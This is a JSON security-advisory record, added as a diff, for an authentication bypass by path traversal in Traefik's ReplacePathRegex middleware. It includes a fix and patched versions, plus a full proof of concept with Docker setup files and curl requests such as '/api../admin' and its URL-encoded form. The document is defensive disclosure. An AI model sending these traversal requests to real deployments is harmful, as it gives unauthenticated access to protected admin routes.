@@ -1,0 +1,147 @@
+{
+  "global": {
+    "cve_id": "CVE-2026-65600",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 9.1,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"
+      },
+      "cvss_v4": {
+        "score": 0,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-22"
+    ],
+    "description": "## Summary\n\nThere is a critical authentication-bypass vulnerability in Traefik's `ReplacePathRegex` middleware. When it is configured with a regular expression that captures user-controlled path segments without a mandatory separator (for example `regex: \"^/api(.*)\"`, `replacement: \"/$1\"`), a crafted request can produce an un-normalized replacement path such as `/../admin`, which Traefik forwarded to the backend without validation. A backend that normalizes the path may resolve it to a protected route, letting an unauthenticated attacker reach resources located behind authentication middleware. This is the same class of issue that was fixed for `StripPrefix` in CVE-2026-48020; that post-replacement normalization check had not been applied to `ReplacePathRegex`. The fix rejects any request whose replaced path does not match its normalized form.\n\n## Patches\n\n- https://github.com/traefik/traefik/releases/tag/v2.11.52\n- https://github.com/traefik/traefik/releases/tag/v3.6.23\n- https://github.com/traefik/traefik/releases/tag/v3.7.7\n\n## For more information\n\nIf you have any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues).\n\n<details>\n<summary>Original Description</summary>\n\n### Summary\nA path traversal vulnerability in the ReplacePathRegex middleware allows an unauthenticated remote attacker to bypass authentication middleware and access protected routes by sending a single crafted HTTP request. The vulnerability exists because ReplacePathRegex does not perform post-replacement path normalization validation - the same check added to StripPrefix in the fix for CVE-2026-48020 was not applied to ReplacePathRegex.\n\n\n### Details\nWhen ReplacePathRegex is configured with a regex that captures user-controlled path segments without a mandatory path separator (e.g., `regex: \"^/api(.*)\"`, `replacement: \"/$1\"`), an attacker can inject implicit traversal sequences into the capture group.\n\n**Root cause:** `pkg/middlewares/replacepathregex/replace_path_regex.go`, function `ServeHTTP` (lines 56-74). After the regex substitution produces a new path, the middleware forwards it to the backend without checking whether the path normalizes differently - unlike StripPrefix which rejects such paths with HTTP 400 after the CVE-2026-48020 fix.\n\n\n**Attack flow:**\n\n1. Attacker sends `GET /api../admin`\n2. `sanitizePath` passes it unchanged (`api..` is a valid segment name, not a dot-segment)\n3. Router matches `PathPrefix(/api)` → selects the public router (no auth middleware)\n4. ReplacePathRegex applies `^/api(.*)` → captures `../admin` → replacement produces `/../admin`\n5. No normalization check exists → path forwarded to backend as-is\n6. Backend framework (Express, Flask, Django, Spring, ASP.NET) normalizes `/../admin` to `/admin`\n7. Attacker receives protected content without authentication\n\n**Suggested fix:** Add the same JoinPath equality check after line 67:\n\n```go\nif cleanPath := req.URL.JoinPath(); cleanPath.Path != req.URL.Path {\n    http.Error(rw, http.StatusText(http.StatusBadRequest), http.StatusBadRequest)\n    return\n}\n```\n\n\n### PoC\n**Prerequisites:** Docker Engine 20.10+, Docker Compose v2, curl\n\n**1. Create `docker-compose.yml`:**\n\n```yaml\nservices:\n  traefik:\n    image: traefik:v3.7.6\n    command:\n      - \"--api.insecure=true\"\n      - \"--providers.file.filename=/etc/traefik/dynamic.yml\"\n      - \"--entrypoints.web.address=:80\"\n    ports:\n      - \"8080:8080\"\n      - \"80:80\"\n    volumes:\n      - ./dynamic.yml:/etc/traefik/dynamic.yml:ro\n    healthcheck:\n      test: [\"CMD\", \"traefik\", \"healthcheck\"]\n      interval: 5s\n      timeout: 3s\n      retries: 5\n  backend:\n    image: node:22-alpine\n    working_dir: /app\n    volumes:\n      - ./server.js:/app/server.js:ro\n    command: [\"node\", \"server.js\"]\n    healthcheck:\n      test: [\"CMD\", \"wget\", \"-qO-\", \"http://localhost:3000/health\"]\n      interval: 5s\n      timeout: 3s\n      retries: 5\n```\n\n**2. Create `dynamic.yml`:**\n\n```yaml\nhttp:\n  routers:\n    public-api:\n      rule: \"PathPrefix(`/api`)\"\n      entryPoints: [web]\n      middlewares: [rewrite-api]\n      service: backend-svc\n      priority: 1\n    protected-admin:\n      rule: \"PathPrefix(`/admin`)\"\n      entryPoints: [web]\n      middlewares: [auth]\n      service: backend-svc\n      priority: 2\n  middlewares:\n    rewrite-api:\n      replacePathRegex:\n        regex: \"^/api(.*)\"\n        replacement: \"/$1\"\n    auth:\n      basicAuth:\n        users:\n          - \"admin:$apr1$H6uskkkW$IgXLP6ewTrSuBkTrqE8wj/\"\n  services:\n    backend-svc:\n      loadBalancer:\n        servers:\n          - url: \"http://backend:3000\"\n```\n\n**3. Create `server.js`:**\n\n```javascript\nconst http = require('http');\nconst path = require('path');\nconst server = http.createServer((req, res) => {\n  const normalized = path.posix.normalize(req.url.split('?')[0]);\n  res.setHeader('Content-Type', 'text/plain');\n  if (normalized === '/health') { res.writeHead(200); res.end('OK\\n'); }\n  else if (normalized === '/admin' || normalized.startsWith('/admin/')) {\n    res.writeHead(200); res.end(`ADMIN_SECRET_DATA (normalized=${normalized})\\n`);\n  } else { res.writeHead(200); res.end(`PUBLIC (normalized=${normalized})\\n`); }\n});\nserver.listen(3000);\n```\n\n**4. Run and exploit:**\n\n```bash\ndocker compose up -d && sleep 5\n\n# Confirm auth is enforced:\ncurl -s -o /dev/null -w \"%{http_code}\" http://localhost/admin\n# → 401\n\n# Auth bypass:\ncurl -s http://localhost/api../admin\n# → ADMIN_SECRET_DATA (normalized=/admin)\n\n# URL-encoded variant:\ncurl -s http://localhost/api%2e%2e/admin\n# → ADMIN_SECRET_DATA (normalized=/admin)\n```\n\n**Configuration note:** The regex `^/api(.*)` (without slash separator before the capture group) is the exploitable pattern. This is the natural way to write a prefix-strip equivalent with ReplacePathRegex and is functionally identical to `StripPrefix(\"/api\")` for legitimate traffic. The pattern `^/api/(.*)` (with mandatory slash) is not exploitable - the same structural narrowing as CVE-2026-48020 where `StripPrefix(\"/api\")` was vulnerable but `StripPrefix(\"/api/\")` was not.\n\n\n### Impact\nAuthentication bypass. Any route protected by auth middleware on a separate router (BasicAuth, ForwardAuth, DigestAuth) can be accessed without credentials by an unauthenticated network attacker via a single HTTP request. Both read and write operations (GET/POST/PUT/DELETE) bypass authentication. The vulnerability affects deployments using ReplacePathRegex for prefix stripping - a common, documented configuration pattern.\n\n</details>\n\n---",
+    "ghsa_id": "GHSA-cxjq-mrr5-89rv",
+    "html_url": "https://github.com/advisories/GHSA-cxjq-mrr5-89rv",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-cxjq-mrr5-89rv"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-65600"
+      }
+    ],
+    "published_at": "2026-08-06T16:51:10Z",
+    "references": [
+      "https://github.com/traefik/traefik/security/advisories/GHSA-cxjq-mrr5-89rv",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-65600",
+      "https://github.com/traefik/traefik/commit/3f10dd442479530560f010167cac2947676d9b29",
+      "https://github.com/traefik/traefik/releases/tag/v2.11.52",
+      "https://github.com/traefik/traefik/releases/tag/v3.6.23",
+      "https://github.com/traefik/traefik/releases/tag/v3.7.7",
+      "https://www.vulncheck.com/advisories/traefik-before-authentication-bypass-via-replacepathregex",
+      "https://github.com/advisories/GHSA-cxjq-mrr5-89rv"
+    ],
+    "severity": "critical",
+    "summary": "Traefik: Authentication Bypass via Path Traversal in ReplacePathRegex Middleware",
+    "updated_at": "2026-08-06T16:51:10Z",
+    "vulnerabilities": [
+      {
+        "first_patched_version": "2.11.52",
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/traefik/traefik/v2"
+        },
+        "vulnerable_version_range": "<= 2.11.51"
+      },
+      {
+        "first_patched_version": "3.6.23",
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/traefik/traefik/v3"
+        },
+        "vulnerable_version_range": "<= 3.6.22"
+      },
+      {
+        "first_patched_version": "3.7.7",
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/traefik/traefik/v3"
+        },
+        "vulnerable_version_range": ">= 3.7.0, <= 3.7.6"
+      },
+      {
+        "first_patched_version": null,
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/traefik/traefik"
+        },
+        "vulnerable_version_range": "<= 1.7.34"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "id": "GHSA-cxjq-mrr5-89rv",
+  "repo": {
+    "cve_id": null,
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": null,
+        "vector_string": null
+      },
+      "cvss_v4": {
+        "score": 7.8,
+        "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:H/SI:H/SA:N"
+      }
+    },
+    "cwe_ids": [
+      "CWE-22"
+    ],
+    "description": "## Summary\n\nThere is a critical authentication-bypass vulnerability in Traefik's `ReplacePathRegex` middleware. When it is configured with a regular expression that captures user-controlled path segments without a mandatory separator (for example `regex: \"^/api(.*)\"`, `replacement: \"/$1\"`), a crafted request can produce an un-normalized replacement path such as `/../admin`, which Traefik forwarded to the backend without validation. A backend that normalizes the path may resolve it to a protected route, letting an unauthenticated attacker reach resources located behind authentication middleware. This is the same class of issue that was fixed for `StripPrefix` in CVE-2026-48020; that post-replacement normalization check had not been applied to `ReplacePathRegex`. The fix rejects any request whose replaced path does not match its normalized form.\n\n## Patches\n\n- https://github.com/traefik/traefik/releases/tag/v2.11.52\n- https://github.com/traefik/traefik/releases/tag/v3.6.23\n- https://github.com/traefik/traefik/releases/tag/v3.7.7\n\n## For more information\n\nIf you have any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues).\n\n<details>\n<summary>Original Description</summary>\n\n### Summary\nA path traversal vulnerability in the ReplacePathRegex middleware allows an unauthenticated remote attacker to bypass authentication middleware and access protected routes by sending a single crafted HTTP request. The vulnerability exists because ReplacePathRegex does not perform post-replacement path normalization validation - the same check added to StripPrefix in the fix for CVE-2026-48020 was not applied to ReplacePathRegex.\n\n\n### Details\nWhen ReplacePathRegex is configured with a regex that captures user-controlled path segments without a mandatory path separator (e.g., `regex: \"^/api(.*)\"`, `replacement: \"/$1\"`), an attacker can inject implicit traversal sequences into the capture group.\n\n**Root cause:** `pkg/middlewares/replacepathregex/replace_path_regex.go`, function `ServeHTTP` (lines 56-74). After the regex substitution produces a new path, the middleware forwards it to the backend without checking whether the path normalizes differently - unlike StripPrefix which rejects such paths with HTTP 400 after the CVE-2026-48020 fix.\n\n\n**Attack flow:**\n\n1. Attacker sends `GET /api../admin`\n2. `sanitizePath` passes it unchanged (`api..` is a valid segment name, not a dot-segment)\n3. Router matches `PathPrefix(/api)` → selects the public router (no auth middleware)\n4. ReplacePathRegex applies `^/api(.*)` → captures `../admin` → replacement produces `/../admin`\n5. No normalization check exists → path forwarded to backend as-is\n6. Backend framework (Express, Flask, Django, Spring, ASP.NET) normalizes `/../admin` to `/admin`\n7. Attacker receives protected content without authentication\n\n**Suggested fix:** Add the same JoinPath equality check after line 67:\n\n```go\nif cleanPath := req.URL.JoinPath(); cleanPath.Path != req.URL.Path {\n    http.Error(rw, http.StatusText(http.StatusBadRequest), http.StatusBadRequest)\n    return\n}\n```\n\n\n### PoC\n**Prerequisites:** Docker Engine 20.10+, Docker Compose v2, curl\n\n**1. Create `docker-compose.yml`:**\n\n```yaml\nservices:\n  traefik:\n    image: traefik:v3.7.6\n    command:\n      - \"--api.insecure=true\"\n      - \"--providers.file.filename=/etc/traefik/dynamic.yml\"\n      - \"--entrypoints.web.address=:80\"\n    ports:\n      - \"8080:8080\"\n      - \"80:80\"\n    volumes:\n      - ./dynamic.yml:/etc/traefik/dynamic.yml:ro\n    healthcheck:\n      test: [\"CMD\", \"traefik\", \"healthcheck\"]\n      interval: 5s\n      timeout: 3s\n      retries: 5\n  backend:\n    image: node:22-alpine\n    working_dir: /app\n    volumes:\n      - ./server.js:/app/server.js:ro\n    command: [\"node\", \"server.js\"]\n    healthcheck:\n      test: [\"CMD\", \"wget\", \"-qO-\", \"http://localhost:3000/health\"]\n      interval: 5s\n      timeout: 3s\n      retries: 5\n```\n\n**2. Create `dynamic.yml`:**\n\n```yaml\nhttp:\n  routers:\n    public-api:\n      rule: \"PathPrefix(`/api`)\"\n      entryPoints: [web]\n      middlewares: [rewrite-api]\n      service: backend-svc\n      priority: 1\n    protected-admin:\n      rule: \"PathPrefix(`/admin`)\"\n      entryPoints: [web]\n      middlewares: [auth]\n      service: backend-svc\n      priority: 2\n  middlewares:\n    rewrite-api:\n      replacePathRegex:\n        regex: \"^/api(.*)\"\n        replacement: \"/$1\"\n    auth:\n      basicAuth:\n        users:\n          - \"admin:$apr1$H6uskkkW$IgXLP6ewTrSuBkTrqE8wj/\"\n  services:\n    backend-svc:\n      loadBalancer:\n        servers:\n          - url: \"http://backend:3000\"\n```\n\n**3. Create `server.js`:**\n\n```javascript\nconst http = require('http');\nconst path = require('path');\nconst server = http.createServer((req, res) => {\n  const normalized = path.posix.normalize(req.url.split('?')[0]);\n  res.setHeader('Content-Type', 'text/plain');\n  if (normalized === '/health') { res.writeHead(200); res.end('OK\\n'); }\n  else if (normalized === '/admin' || normalized.startsWith('/admin/')) {\n    res.writeHead(200); res.end(`ADMIN_SECRET_DATA (normalized=${normalized})\\n`);\n  } else { res.writeHead(200); res.end(`PUBLIC (normalized=${normalized})\\n`); }\n});\nserver.listen(3000);\n```\n\n**4. Run and exploit:**\n\n```bash\ndocker compose up -d && sleep 5\n\n# Confirm auth is enforced:\ncurl -s -o /dev/null -w \"%{http_code}\" http://localhost/admin\n# → 401\n\n# Auth bypass:\ncurl -s http://localhost/api../admin\n# → ADMIN_SECRET_DATA (normalized=/admin)\n\n# URL-encoded variant:\ncurl -s http://localhost/api%2e%2e/admin\n# → ADMIN_SECRET_DATA (normalized=/admin)\n```\n\n**Configuration note:** The regex `^/api(.*)` (without slash separator before the capture group) is the exploitable pattern. This is the natural way to write a prefix-strip equivalent with ReplacePathRegex and is functionally identical to `StripPrefix(\"/api\")` for legitimate traffic. The pattern `^/api/(.*)` (with mandatory slash) is not exploitable - the same structural narrowing as CVE-2026-48020 where `StripPrefix(\"/api\")` was vulnerable but `StripPrefix(\"/api/\")` was not.\n\n\n### Impact\nAuthentication bypass. Any route protected by auth middleware on a separate router (BasicAuth, ForwardAuth, DigestAuth) can be accessed without credentials by an unauthenticated network attacker via a single HTTP request. Both read and write operations (GET/POST/PUT/DELETE) bypass authentication. The vulnerability affects deployments using ReplacePathRegex for prefix stripping - a common, documented configuration pattern.\n\n</details>\n",
+    "ghsa_id": "GHSA-cxjq-mrr5-89rv",
+    "html_url": "https://github.com/traefik/traefik/security/advisories/GHSA-cxjq-mrr5-89rv",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-cxjq-mrr5-89rv"
+      }
+    ],
+    "published_at": "2026-07-09T08:51:09Z",
+    "references": [],
+    "severity": "high",
+    "summary": "Authentication Bypass via Path Traversal in ReplacePathRegex Middleware",
+    "updated_at": "2026-07-09T09:03:45Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/traefik/traefik"
+        },
+        "patched_versions": "",
+        "vulnerable_version_range": "<= v1.7.34"
+      },
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/traefik/traefik/v2"
+        },
+        "patched_versions": "v2.11.52",
+        "vulnerable_version_range": "<= v2.11.51"
+      },
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/traefik/traefik/v3"
+        },
+        "patched_versions": "v3.6.23",
+        "vulnerable_version_range": ">= v3.0.0, <= v3.6.22"
+      },
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/traefik/traefik/v3"
+        },
+        "patched_versions": "v3.7.7",
+        "vulnerable_version_range": ">= v3.7.0, <= v3.7.6"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "traefik/traefik"
+}
